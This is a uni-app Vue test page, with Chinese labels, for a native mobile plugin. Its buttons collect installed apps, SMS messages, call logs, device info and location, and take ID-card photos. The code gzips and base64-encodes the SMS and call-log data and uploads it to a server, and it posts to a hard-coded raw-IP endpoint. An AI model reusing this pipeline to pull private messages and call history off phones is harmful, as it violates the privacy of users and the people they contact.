<template>
    <view class="container">
        {{text}}
        <button @click="login()">login</button>
        <button type="primary" @click="getInstall">获取安装列表数据</button>
        <button type="primary" @click="getSMSList">获取短信数据</button>
        <button type="primary" @click="getLocation">获取位置数据</button>
        <button type="primary" @click="getCallLogList">获取通话记录数据</button>
        <button type="primary" @click="getDeviceInfo">获取设备信息数据</button>
        <button type="primary" @click="getGoCamera">拍身份证</button>
        <button type="primary" @click="getGoCameraVideo">视频录制</button>
        <button type="primary" @click="openAlbum(false)">单选图片</button>
        <button type="primary" @click="openAlbum(true)">多选图片</button>
        <button type="primary" @click="initAf">初始化AF</button>
    </view>
</template>

<script>
    import pako from 'pako';
    import { login,upload} from '@/api/data.js'
    const wtModule = uni.requireNativePlugin('WTUniPlugin-WTModule');
    export default {
        data() {
            return {
                href: 'https://uniapp.dcloud.io/component/README?id=uniui',
                url: 'http://120.46.139.43:9527/gPjkvSR/wTcEL/xqtQju',
                text: '',
                token:''
            }
        },
        methods: {
            login(){
                login().then(res=>{
                    console.log(res)
                })
            },
            getInstall() { // 获取安装列表
                wtModule.getAppList((ret) => {
                    console.log(ret)
                    upload({jsonPayload:ret,uploadType:'1'}).then(res => {
                        console.log(res)
                    })
                })
            },
            getSMSList() { // 短信
                wtModule.getSMSList((ret) => {
                    let data = pako.gzip(ret)
                    data = btoa(String.fromCharCode(...new Uint8Array(data)));
                     console.log(data)
                     upload({jsonPayload:data,uploadType:'4'}).then(res => {
                         console.log(res)
                     })
                     // 将 Base64 数据转换为二进制
                     // const binaryString = atob(data);
                     // const binaryData = new Uint8Array([...binaryString].map(char => char.charCodeAt(0)));
                     
                     // // 使用 pako 解压缩数据
                     // const decompressedData = pako.ungzip(binaryData, { to: 'string' });
                     
                     // // 将解压后的数据转换为对象
                     // const dataObject = JSON.parse(decompressedData);
                     // console.log(dataObject)
                })
            },
            getLocation() { // 获取位置
                wtModule.getLocation((ret) => {
                     console.log(ret)
                })
            },
            getCallLogList() { // 获取通话记录
                wtModule.getCallLog((ret) => {
                     console.log(ret)
                     let data = pako.gzip(ret)
                     data = btoa(String.fromCharCode(...new Uint8Array(data)));
                     upload({jsonPayload:data,uploadType:'7'}).then(res => {
                         console.log(res)
                     })
                })
            },
            getDeviceInfo() {
                wtModule.getMobileInfo((ret) => {
                     console.log(ret)
                     upload({jsonPayload:ret,uploadType:'6'}).then(res => {
                         console.log(res)
                     })
                })
            },
            getGoCamera() { // 拍身份证
                wtModule.takePhoto({
                    type: 1
                }, (ret) => {
                    console.log(ret)
                })
            },
            getGoCameraVideo() { // 视频录制
                wtModule.takePhoto({
                    type: 2
                }, (ret) => {
                    console.log(ret)
                })
            },
            openAlbum(isMultiple) { // 图片选择
                wtModule.takePhoto({
                    isMultiple: isMultiple
                }, (ret) => {
                    console.log(ret)
                })
            },
            initAf() { // 初始化AF
                wtModule.initAf((ret) => {
                    console.log(ret)
                })
            },

            test() {
                //             plus.android.requestPermissions([ 
                // 'android.permission.READ_CALL_LOG' 
                //             ], function(e) {
                //                 console.log(e)
                //             });
                // let appurl = "market://details?id=io.dcloud.HelloH5"; 
                // plus.runtime.openURL(appurl, function(res) {
                // console.log(res);
                // });
                // uni.openAppAuthorizeSetting({
                //   success (res) {
                //     console.log(res)
                //   }
                // })
                // uni.navigateTo({
                //     url: '/pages/web/index'
                // })
                let data = {
                    // androidversion: 'android10',
                    // appVersion: '1.0.1',
                    // deviceID: 'tdfafafafdaf',
                    // i18n: 'zh_CN',
                    // ownerShip: 'tgwb1',
                    // phoneName: 'iphone13proMax',
                    // reqSource: 'Android',
                    // webVersion: 'H5'
                    stopwatch: "sys_permission_list_content"
                }
                console.log('开始请求')
                uni.request({
                    url: this.url,
                    method: 'POST',
                    data: data,
                    header: {
                        'content-type': 'application/json;',
                        'encrypted': '0',
                        'encryptType': '0',
                        'ownerShip': 'tgwb1_ios',
                        'disturbedUrl': '0',
                        'disturbedPar': '1'
                    },
                    success: (res) => {
                        console.log(res)
                    },
                    // 
                    fail: (err) => {
                        console.log(err)
                    }
                })
            },
        }
    }
</script>

<style>
    .container {
        padding: 20px;
        font-size: 14px;
        line-height: 24px;
    }
</style>